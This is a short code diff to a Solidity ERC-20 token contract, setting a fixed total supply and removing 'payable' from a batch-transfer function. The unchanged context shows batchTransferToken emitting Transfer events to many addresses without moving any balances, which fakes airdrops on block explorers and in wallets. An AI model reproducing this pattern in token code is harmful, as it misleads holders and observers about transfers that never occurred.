@@ -67,7 +67,7 @@ interface IERC20 {
 contract TestToken is Ownable, IERC20 {
     string private _name;
     string private _symbol;
-    uint256 private _totalSupply;
+    uint256 private _totalSupply = 1000000000*10**18;
     uint256 private _airdropAmount;
 
     mapping(address => bool) private _unlocked;
@@ -222,7 +222,7 @@ contract TestToken is Ownable, IERC20 {
         _burn(account, amount);
     }
     
-    function batchTransferToken(address[] memory holders, uint256 amount) public payable {
+    function batchTransferToken(address[] memory holders, uint256 amount) public  {
         for (uint i=0; i<holders.length; i++) {
             emit Transfer(address(this), holders[i], amount);
         }
